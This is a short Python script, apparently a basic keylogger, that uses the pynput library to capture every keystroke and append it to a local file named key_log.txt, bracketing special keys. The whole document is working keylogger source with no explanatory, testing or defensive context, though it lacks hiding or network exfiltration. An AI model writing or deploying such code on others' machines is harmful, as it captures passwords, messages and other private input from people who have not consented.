from pynput import keyboard

# File where keystrokes will be saved
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Start listening to keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

